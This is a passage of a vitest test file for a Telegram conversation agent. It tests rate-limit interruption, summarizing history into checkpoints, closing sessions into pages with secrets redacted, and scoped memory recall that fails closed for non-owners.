    await vi.waitFor(() => expect(world.sends).toHaveLength(2));
    expect(world.sends).toEqual([
      { text: "Ok.", silent: false },
      { text: `It's all on ${MENU}.`, silent: false, previewUrl: MENU },
    ]);
  });
});

describe("ConversationAgent rate limits and interruption", () => {
  it("doesn't count a bubble waiting out a rate limit as seen when a message interrupts", async () => {
    const world = use(fakeWorld([reply("One.\n\nTwo."), reply("Fine.")]));
    world.rateLimitSends.add(0);
    // Sleep 0 is the first bubble's pacing; sleep 1 is the wait the rate limit asked for.
    world.blockSleeps.add(1);
    const stub = agent("rate-limit-interrupted");
    await stub.ingest(message("m1", "two things?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.rateLimitSends.size).toBe(1));
    await vi.waitFor(async () => expect(await statuses(stub)).toEqual(["pending", "pending"]));

    await stub.ingest(message("m2", "never mind"));
    await stub.flush();

    await vi.waitFor(() => expect(world.sent).toEqual(["Fine."]));
    expect(
      (await stub.outbox()).filter((row) => row.turnId === 1).map((row) => row.status),
    ).toEqual(["cancelled", "cancelled"]);
    // History holds no reply for the first turn: nothing of it reached the user.
    expect(JSON.stringify(world.requests[1]?.messages)).not.toContain("One.");
  });
});

describe("ConversationAgent checkpoints", () => {
  /** One turn per text, each delivered before the next. */
  async function converse(stub: ReturnType<typeof agent>, texts: string[], first = 0) {
    for (const [index, text] of texts.entries()) {
      await stub.ingest(message(`m${first + index}`, text));
      await stub.flush();
      await vi.waitFor(async () => expect((await stub.turns()).at(-1)?.status).toBe("delivered"));
    }
  }

  const pendingCheckpoints = (stub: ReturnType<typeof agent>) =>
    runInDurableObject(stub, async (instance: ConversationAgent) =>
      (await instance.listSchedules()).filter((schedule) => schedule.callback === "compact"),
    );

  const checkpointCount = (stub: ReturnType<typeof agent>) =>
    runInDurableObject(
      stub,
      (_instance: ConversationAgent, state) =>
        state.storage.sql.exec<{ n: number }>("SELECT count(*) AS n FROM checkpoints").one().n,
    );

  const replies = (count: number) => Array.from({ length: count }, (_, i) => reply(`r${i}`));
  const questions = (count: number) => Array.from({ length: count }, (_, i) => `q${i}`);

  it("summarizes all but the latest rows once a turn's prompt crosses the budget", async () => {
    const world = use(
      fakeWorld([...replies(5), reply("r5", OVER_BUDGET), reply("THE SUMMARY"), reply("r6")]),
    );
    const stub = agent("checkpoint");
    await converse(stub, questions(5));
    expect(await pendingCheckpoints(stub)).toEqual([]);
    await converse(stub, ["q5"], 5);
    expect(await pendingCheckpoints(stub)).toHaveLength(1);

    await stub.compact();
    expect(await pendingCheckpoints(stub)).toEqual([]);
    expect(world.tiers.at(-1)).toBe("cheap");
    const summarized = JSON.stringify(world.requests.at(-1)?.messages);
    for (const text of ["q0", "r0", "q2", "r2"]) expect(summarized).toContain(text);
    for (const text of ["q3", "r3", "q5", "r5"]) expect(summarized).not.toContain(text);

    await converse(stub, ["q6"], 6);
    const next = world.requests.at(-1);
    expect(next?.system).toBe(world.requests[0]?.system);
    // The summary leads the first kept message; rows from before the checkpoint lose native output.
    expect(next?.messages).toEqual([
      {
        role: "user",
        parts: [
          { type: "text", text: expect.stringContaining("THE SUMMARY") },
          { type: "text", text: `${STAMP} q3` },
        ],
      },
      neutral("r3"),
      user("q4"),
      neutral("r4"),
      user("q5"),
      neutral("r5"),
      user("q6"),
    ]);
  });

  it("replays the reply of a turn that overlapped a checkpoint without native output", async () => {
    const world = use(
      fakeWorld([
        ...replies(5),
        reply("r5", OVER_BUDGET),
        held("r6"),
        reply("THE SUMMARY"),
        reply("r7"),
      ]),
    );
    const stub = agent("checkpoint-overlap");
    await converse(stub, questions(6));

    world.modelHeld = true;
    await stub.ingest(message("m6", "q6"));
    await stub.flush();
    await vi.waitFor(() => expect(world.requests).toHaveLength(7));
    await stub.compact();
    world.modelHeld = false;
    await vi.waitFor(async () => expect((await stub.turns()).at(-1)?.status).toBe("delivered"));

    await converse(stub, ["q7"], 7);
    const next = world.requests.at(-1);
    expect(JSON.stringify(next?.messages)).toContain("r6");
    expect(next?.messages.some((m) => "native" in m)).toBe(false);
  });

  it("folds the previous summary into the next one", async () => {
    const world = use(
      fakeWorld([
        ...replies(5),
        reply("r5", OVER_BUDGET),
        reply("THE SUMMARY"),
        reply("r6"),
        reply("r7"),
        reply("r8", OVER_BUDGET),
        reply("SECOND SUMMARY"),
      ]),
    );
    const stub = agent("checkpoint-fold");
    await converse(stub, questions(6));
    await stub.compact();
    await converse(stub, ["q6", "q7", "q8"], 6);
    expect(await pendingCheckpoints(stub)).toHaveLength(1);

    await stub.compact();
    expect(JSON.stringify(world.requests.at(-1)?.messages)).toContain("THE SUMMARY");
    expect(JSON.stringify((await stub.history())[0])).toContain("SECOND SUMMARY");
  });

  it("writes nothing when the summary fails, and waits an hour before trying again", async () => {
    vi.spyOn(console, "error").mockImplementation(() => {});
    const world = use(
      fakeWorld([
        ...replies(5),
        reply("r5", OVER_BUDGET),
        fail(),
        reply("r6", OVER_BUDGET),
        reply("r7", OVER_BUDGET),
      ]),
    );
    const stub = agent("checkpoint-failure");
    await converse(stub, questions(6));

    await stub.compact();
    expect((await stub.history())[0]).toEqual(user("q0"));
    expect(await pendingCheckpoints(stub)).toEqual([]);

    await converse(stub, ["q6"], 6);
    expect(await pendingCheckpoints(stub)).toEqual([]);
    world.clock += 61 * 60_000;
    await converse(stub, ["q7"], 7);
    expect(await pendingCheckpoints(stub)).toHaveLength(1);
  });

  it("writes nothing when the summarizer refuses", async () => {
    vi.spyOn(console, "warn").mockImplementation(() => {});
    use(fakeWorld([...replies(5), reply("r5", OVER_BUDGET), refuse()]));
    const stub = agent("checkpoint-refusal");
    await converse(stub, questions(6));
    await stub.compact();
    expect(await checkpointCount(stub)).toBe(0);
  });

  it("writes one checkpoint when two runs race", async () => {
    use(fakeWorld([...replies(5), reply("r5", OVER_BUDGET), reply("S1"), reply("S2")]));
    const stub = agent("checkpoint-race");
    await converse(stub, questions(6));
    await Promise.all([stub.compact(), stub.compact()]);
    expect(await checkpointCount(stub)).toBe(1);
  });

  it("measures the budget on the prompt of the attempt that answered, not every attempt", async () => {
    const attempt = { ...OVER_BUDGET[0], inputUncached: 0, cacheRead: 60_000 } as Usage;
    use(fakeWorld([...replies(5), reply("r5", [attempt, attempt])]));
    const stub = agent("checkpoint-attempts");
    await converse(stub, questions(6));
    expect(await pendingCheckpoints(stub)).toEqual([]);
  });

  it("waits for enough new rows before summarizing again", async () => {
    use(
      fakeWorld([
        ...replies(5),
        reply("r5", OVER_BUDGET),
        reply("THE SUMMARY"),
        reply("r6", OVER_BUDGET),
      ]),
    );
    const stub = agent("checkpoint-tail");
    await converse(stub, questions(6));
    await stub.compact();

    // The kept rows alone may stay over the budget; one more turn isn't enough to summarize.
    await converse(stub, ["q6"], 6);
    expect(await pendingCheckpoints(stub)).toEqual([]);
  });
});

describe("ConversationAgent sessions", () => {
  // A bot token, assembled at run time so no key-shaped literal sits in the repository.
  const botToken = ["123456789", ":", "AA", "x".repeat(33)].join("");

  /** When the session's close is armed, in minutes after the fake clock. */
  async function closesIn(stub: ReturnType<typeof agent>, world: FakeWorld) {
    const schedules = await runInDurableObject(stub, (instance) => instance.listSchedules());
    return schedules
      .filter((schedule) => schedule.callback === "closeSession")
      .map((schedule) => Math.round((schedule.time * 1_000 - world.clock) / 60_000));
  }

  async function deliveredTurn(stub: ReturnType<typeof agent>, world: FakeWorld, text: string) {
    await stub.ingest(message("m1", text));
    await stub.flush();
    await vi.waitFor(async () =>
      expect(await stub.turns()).toMatchObject([{ status: "delivered" }]),
    );
    expect(world.sent.length).toBeGreaterThan(0);
  }

  it("turns a Telegram conversation into a session page, with its secrets replaced", async () => {
    const world = use(fakeWorld([reply("Anotado, não vou repetir o token.")]));
    const stub = agent("session-page");
    await deliveredTurn(stub, world, `guarda o token do bot: ${botToken}`);
    // The turn armed the session's close for when the conversation goes quiet.
    const armed = await runInDurableObject(stub, (_instance, state) =>
      state.storage.sql
        .exec<{ value: string }>("SELECT value FROM state WHERE key = 'sessionSchedule'")
        .toArray(),
    );
    expect(armed).toHaveLength(1);

    await stub.closeSession();
    expect(world.remembered).toHaveLength(1);
    const [{ agentId, changes } = { agentId: "", changes: [] }] = world.remembered;
    expect(agentId).toBe("assistant");
    const [page] = changes;
    expect(page?.path).toMatch(/^conversations\/telegram-chat-1\/sessions\/\d{4}\//);
    expect(page?.content).toContain("guarda o token do bot: [REDACTED:telegram_token]");
    expect(page?.content).toContain("Anotado, não vou repetir o token.");
    expect(page?.content).not.toContain(botToken);
    expect(page?.content).not.toContain("[Sun 4 Oct 2026");

    // Captured history isn't written twice.
    await stub.closeSession();
    expect(world.remembered).toHaveLength(1);
  });

  it("keeps the session for later when the Context Store can't be reached", async () => {
    const world = use(fakeWorld([reply("Ok.")]));
    const stub = agent("session-retry");
    await deliveredTurn(stub, world, "lembra de comprar café");
    world.failRemember = true;
    await stub.closeSession();
    expect(world.remembered).toEqual([]);
    expect(await closesIn(stub, world)).toEqual([10]);
    world.failRemember = false;
    await stub.closeSession();
    expect(world.remembered).toHaveLength(1);
    expect(world.remembered[0]?.changes[0]?.content).toContain("lembra de comprar café");
  });

  it("waits to close a session while a turn runs or a message waits for one", async () => {
    const world = use(fakeWorld([reply("Ok."), held("Feito.")]));
    const stub = agent("session-busy");
    await deliveredTurn(stub, world, "primeira mensagem");
    await stub.ingest(message("m2", "segunda mensagem"));
    await stub.closeSession();
    expect(world.remembered).toEqual([]);
    expect(await closesIn(stub, world)).toEqual([10]);

    world.modelHeld = true;
    await stub.flush();
    await vi.waitFor(() => expect(world.requests).toHaveLength(2));
    await stub.closeSession();
    expect(world.remembered).toEqual([]);

    world.modelHeld = false;
    await vi.waitFor(async () =>
      expect((await stub.turns()).map((turn) => turn.status)).toEqual(["delivered", "delivered"]),
    );
    await stub.closeSession();
    expect(world.remembered).toHaveLength(1);
    const content = world.remembered[0]?.changes[0]?.content ?? "";
    expect(content).toContain("primeira mensagem");
    expect(content).toContain("segunda mensagem");
    expect(content).toContain("Feito.");
  });

  it("skips a session whose page can't be built, and writes the next one", async () => {
    const world = use(fakeWorld([reply("Ok."), reply("Certo.")]));
    const stub = agent("session-poison");
    await deliveredTurn(stub, world, "primeira conversa");
    // A row no page can be built from: its time is past what a date can hold.
    await runInDurableObject(stub, (_instance, state) => {
      state.storage.sql.exec(
        "UPDATE history SET created_at = ? WHERE id = (SELECT MAX(id) FROM history)",
        9e15,
      );
    });
    await stub.closeSession();
    expect(world.remembered).toEqual([]);

    await stub.ingest(message("m2", "segunda conversa"));
    await stub.flush();
    await vi.waitFor(async () =>
      expect((await stub.turns()).map((turn) => turn.status)).toEqual(["delivered", "delivered"]),
    );
    await stub.closeSession();
    expect(world.remembered).toHaveLength(1);
    const content = world.remembered[0]?.changes[0]?.content ?? "";
    expect(content).toContain("segunda conversa");
    expect(content).not.toContain("primeira conversa");
  });

  it("keeps a private key pasted across two sessions out", async () => {
    const world = use(fakeWorld([reply("Ok."), reply("Certo.")]));
    const stub = agent("session-key");
    const body = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB".repeat(2);
    await deliveredTurn(stub, world, ["a chave: -----BEGIN ", "PRIVATE KEY-----"].join(""));
    await stub.closeSession();
    await stub.ingest(message("m2", body));
    await stub.flush();
    await vi.waitFor(async () =>
      expect((await stub.turns()).map((turn) => turn.status)).toEqual(["delivered", "delivered"]),
    );
    await stub.closeSession();
    expect(world.remembered).toHaveLength(2);
    expect(world.remembered[1]?.changes[0]?.content).toContain("[REDACTED:private_key]");
    expect(world.remembered[1]?.changes[0]?.content).not.toContain(body);
  });

  it("keeps the time zone of the latest message, not of a retried one", async () => {
    use(fakeWorld([]));
    const stub = agent("session-zone");
    await stub.ingest(message("m1", "oi", { timeZone: "America/Sao_Paulo" }));
    await stub.ingest(message("m2", "tudo bem?", { timeZone: "Europe/Lisbon" }));
    expect(await stub.ingest(message("m1", "oi", { timeZone: "America/Sao_Paulo" }))).toMatchObject(
      { status: "duplicate" },
    );
    const zone = await runInDurableObject(stub, (_instance, state) =>
      state.storage.sql
        .exec<{ value: string }>("SELECT value FROM state WHERE key = 'timeZone'")
        .one(),
    );
    expect(JSON.parse(zone.value)).toBe("Europe/Lisbon");
  });
});

describe("ConversationAgent memory", () => {
  const MEMORY = [
    `<memory-abc note="Notes from the owner's vault, for reference.">`,
    "## Ana (people/ana.md) [abc]",
    "Mora em Lisboa.",
    "</memory-abc>",
  ].join("\n");
  const options = { scopes: "all", budgetTokens: 1_000, qualifier: "clef" };
  /** What any turn but the owner's in a direct chat may see: its own conversation (#131). */
  const narrow = { ...options, scopes: ["conversation/telegram-chat-1"] };

  it("asks for every scope only for the owner in a direct chat, and fails closed", async () => {
    const world = use(fakeWorld(Array.from({ length: 6 }, () => reply("Ok."))));
    const cases: [Record<string, unknown>, unknown][] = [
      [{}, options],
      [{ chatType: "group" }, narrow],
      [{ role: "member" }, narrow],
      [{ role: "admin" }, narrow],
      // As an ingress from before #131 sends it, and values no ingress sends.
      [{ role: undefined, chatType: undefined }, narrow],
      [{ role: "root", chatType: "dm" }, narrow],
    ];
    for (const [i, [overrides, expected]] of cases.entries()) {
      const stub = agent(`memory-scopes-${i}`);
      await stub.ingest({ ...message("m1", "onde a Ana mora?"), ...overrides });
      await stub.flush();
      await vi.waitFor(() => expect(world.recalls).toHaveLength(i + 1));
      expect(world.recalls[i]?.options, JSON.stringify(overrides)).toEqual(expected);
    }
  });

  it("takes a turn's least-privileged author, and each turn on its own", async () => {
    const world = use(fakeWorld([reply("Ok."), reply("Ok.")]));
    const stub = agent("memory-scopes-mixed");
    await stub.ingest(message("m1", "onde a Ana mora?"));
    await stub.ingest({ ...message("m2", "e o Bruno?", { userId: "u-guest" }), role: "member" });
    await stub.flush();
    await vi.waitFor(() => expect(world.recalls).toHaveLength(1));
    expect(world.recalls[0]?.options).toEqual(narrow);

    await vi.waitFor(async () => expect((await stub.turns()).at(-1)?.status).toBe("delivered"));
    await stub.ingest(message("m3", "e a Patrícia?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.recalls).toHaveLength(2));
    expect(world.recalls[1]?.options).toEqual(options);
  });

  it("sends a turn's memories with its request, and again in place on later ones", async () => {
    const world = use(fakeWorld([reply("Em Lisboa."), reply("Não sei."), reply("Também não.")]));
    const logged = vi.spyOn(console, "log").mockImplementation(() => {});
    world.memory = MEMORY;
    const stub = agent("memory-request");
    await stub.ingest(message("m1", "onde a Ana mora?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.sent).toEqual(["Em Lisboa."]));
    expect(world.recalls).toEqual([
      { agentId: "assistant", question: "onde a Ana mora?", options },
    ]);
    expect(world.requests[0]).toMatchObject({
      messages: [user("onde a Ana mora?")],
      context: MEMORY,
    });
    expect(world.requests[0]?.system.endsWith(`\n\n${MEMORY_NOTE}`)).toBe(true);

    // Each answered message is left out of the next turn's question.
    for (const [id, text] of [
      ["m2", "e o Bruno?"],
      ["m3", "e a Patrícia?"],
    ] as const) {
      await stub.ingest(message(id, text));
      await stub.flush();
      await vi.waitFor(async () => expect((await stub.turns()).at(-1)?.status).toBe("delivered"));
    }
    expect(world.recalls.map(({ question }) => question)).toEqual([
      "onde a Ana mora?",
      "e o Bruno?",
      "e a Patrícia?",
    ]);
    // An answered turn's block stays where it was sent, so the prefix before each reply is
    // unchanged (#137): Anthropic binds a reply's thinking to everything sent before it.
    const withMemory = (text: string) => ({
      role: "user",
      parts: [...user(text).parts, { type: "text", text: MEMORY }],
    });
    const third = world.requests[2]?.messages ?? [];
    expect(third).toHaveLength(5);
    expect(third[0]).toEqual(withMemory("onde a Ana mora?"));
    expect(third[2]).toEqual(withMemory("e o Bruno?"));
    expect(third[4]).toEqual(user("e a Patrícia?"));
    expect(world.requests[1]?.messages[0]).toEqual(third[0]);
    // History itself never holds a block: transcripts, session pages and checkpoints read it.
    const stored = await runInDurableObject(stub, (_instance, state) =>
      state.storage.sql.exec("SELECT message FROM history").toArray(),
    );
    expect(JSON.stringify(stored)).not.toContain("Mora em Lisboa");
    const recall = logged.mock.calls.find(([line]) => line === "conversation: recall");
    expect(recall?.[1]).toEqual({ ms: 0, notes: 1, tokens: Math.ceil(MEMORY.length / 4) });
    expect(JSON.stringify(logged.mock.calls)).not.toMatch(/Lisboa|Ana/);
  });

  it("sends again the block of the attempt that answered, and never a blank one", async () => {
    const world = use(fakeWorld([hang(), reply("Em Lisboa."), reply("Ok.")]));
    world.memory = MEMORY;
    const stub = agent("memory-retry");
    await stub.ingest(message("m1", "onde a Ana mora?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.requests).toHaveLength(1));
    // The retry after an eviction finds nothing, so nothing was sent with the reply.
    await evictDurableObject(stub);
    world.memory = "  \n";
    await runDurableObjectAlarm(stub);
    await vi.waitFor(() => expect(world.sent).toEqual(["Em Lisboa."]));
    expect(world.requests[1]).not.toHaveProperty("context");

    await stub.ingest(message("m2", "e o Bruno?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.requests).toHaveLength(3));
    expect(world.requests[2]?.messages[0]).toEqual(user("onde a Ana mora?"));
  });

  it("puts a turn's block after its last user message, whoever wrote it", async () => {
    const world = use(fakeWorld([reply("Ok."), reply("Ok de novo.")]));
    world.memory = MEMORY;
    const stub = agent("memory-authors");
    await stub.ingest(message("m1", "onde a Ana mora?", { userId: "u-one" }));
    await stub.ingest(message("m2", "e o Bruno?", { userId: "u-two" }));
    await stub.flush();
    await vi.waitFor(() => expect(world.sent).toEqual(["Ok."]));
    await stub.ingest(message("m3", "e a Patrícia?", { userId: "u-one" }));
    await stub.flush();
    await vi.waitFor(() => expect(world.requests).toHaveLength(2));
    expect(world.requests[1]?.messages.slice(0, 2)).toEqual([
      user("onde a Ana mora?"),
      { role: "user", parts: [...user("e o Bruno?").parts, { type: "text", text: MEMORY }] },
    ]);
  });

  it("sends no block again for a turn that got no reply", async () => {
    const world = use(fakeWorld([fail(), reply("Em Lisboa.")]));
    world.memory = MEMORY;
    const stub = agent("memory-unanswered-turn");
    await stub.ingest(message("m1", "onde a Ana mora?"));
    await stub.flush();
    await vi.waitFor(async () => expect((await stub.turns()).at(-1)?.status).toBe("failed"));
    await stub.ingest(message("m2", "e o Bruno?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.requests).toHaveLength(2));
    expect(world.requests[1]?.messages).toEqual([user("onde a Ana mora?"), user("e o Bruno?")]);
    // Nor is it kept.
    const kept = await runInDurableObject(stub, (_instance, state) =>
      state.storage.sql.exec("SELECT context FROM turns ORDER BY id").toArray(),
    );
    expect(kept[0]).toEqual({ context: null });
  });

  it("asks once about every message still unanswered, with the agent's qualifier", async () => {
    const world = use(fakeWorld([reply("Os dois.")]));
    await configure("memory-jev", { qualifier: "jev" });
    world.recallHeld = true;
    const stub = agent("memory-unanswered");
    await stub.ingest(message("m1", "onde a Ana mora?", { agentId: "memory-jev" }));
    await stub.flush();
    await vi.waitFor(() => expect(world.recalls).toHaveLength(1));
    // "Typing" shows while the person waits for memory.
    expect(world.typingKept).toBe(1);

    // A message during the lookup interrupts the turn before it calls the model.
    await stub.ingest(message("m2", "e o Bruno?", { agentId: "memory-jev" }));
    world.recallHeld = false;
    await stub.flush();
    await vi.waitFor(() => expect(world.sent).toEqual(["Os dois."]));
    expect(world.requests).toHaveLength(1);
    expect(world.recalls.map(({ question, options }) => [question, options.qualifier])).toEqual([
      ["onde a Ana mora?", "jev"],
      ["onde a Ana mora?\ne o Bruno?", "jev"],
    ]);
  });

  it("skips the lines of bare acknowledgements, and the lookup when nothing else is left", async () => {
    const world = use(fakeWorld([reply("😊"), reply("Em Lisboa.")]));
    world.memory = MEMORY;
    const stub = agent("memory-acknowledgement");
    await stub.ingest(message("m1", "valeu!"));
    await stub.ingest(message("m2", "obrigado"));
    await stub.flush();
    await vi.waitFor(() => expect(world.requests).toHaveLength(1));
    expect(world.recalls).toEqual([]);
    expect(world.requests[0]).not.toHaveProperty("context");

    await stub.ingest(message("m3", "ok"));
    await stub.ingest(message("m4", "onde a Ana mora?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.requests).toHaveLength(2));
    expect(world.recalls.map(({ question }) => question)).toEqual(["onde a Ana mora?"]);
  });

  it("asks about the newest 2,000 characters, never from half of an emoji", async () => {
    const world = use(fakeWorld([reply("Em Lisboa.")]));
    const stub = agent("memory-long");
    // 4 + 3,000 + 17 characters: the newest 2,000 start on the second half of an emoji.
    await stub.ingest(message("m1", `Ana ${"😀".repeat(1_500)}`));
    await stub.ingest(message("m2", "onde a Ana mora?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.recalls).toHaveLength(1));
    const question = world.recalls[0]?.question ?? "";
    expect(question.length).toBe(1_999);
    expect(question.startsWith("😀")).toBe(true);
    expect(question.endsWith("\nonde a Ana mora?")).toBe(true);
  });

  it("answers without memory when recall fails, answers past its budget or finds nothing", async () => {
    const world = use(fakeWorld([]));
    const warned = vi.spyOn(console, "warn").mockImplementation(() => {});
    const logged = vi.spyOn(console, "log").mockImplementation(() => {});
    const stub = agent("memory-failed");
    const turn = async (id: string, text: string) => {
      await stub.ingest(message(id, text));
      await stub.flush();
      await vi.waitFor(async () => expect((await stub.turns()).at(-1)?.status).toBe("delivered"));
    };

    world.failRecall = true;
    await turn("m1", "onde a Ana mora?");
    world.failRecall = false;
    world.memory = "a".repeat(4_001);
    await turn("m2", "e o Bruno?");
    world.memory = { length: 1 } as unknown as string;
    await turn("m3", "e o Caio?");
    world.memory = "";
    await turn("m4", "e a Patrícia?");
    // Exactly the budget is fine.
    world.memory = "a".repeat(4_000);
    await turn("m5", "e a Dora?");

    expect(world.recalls).toHaveLength(5);
    for (const request of world.requests.slice(0, 4)) {
      expect(request).not.toHaveProperty("context");
    }
    expect(world.requests[4]?.context).toHaveLength(4_000);
    const failures = warned.mock.calls.filter(([line]) => line === "conversation: recall failed");
    expect(failures.map(([, fields]) => fields)).toEqual([
      { ms: 0, error: "Error" },
      { ms: 0, error: "TypeError" },
      { ms: 0, error: "TypeError" },
    ]);
    const recall = logged.mock.calls.find(([line]) => line === "conversation: recall");
    expect(recall?.[1]).toEqual({ ms: 0, notes: 0, tokens: 0 });
    expect(JSON.stringify([...warned.mock.calls, ...logged.mock.calls])).not.toMatch(
      /Ana|Bruno|Patrícia/,
    );
  });
});
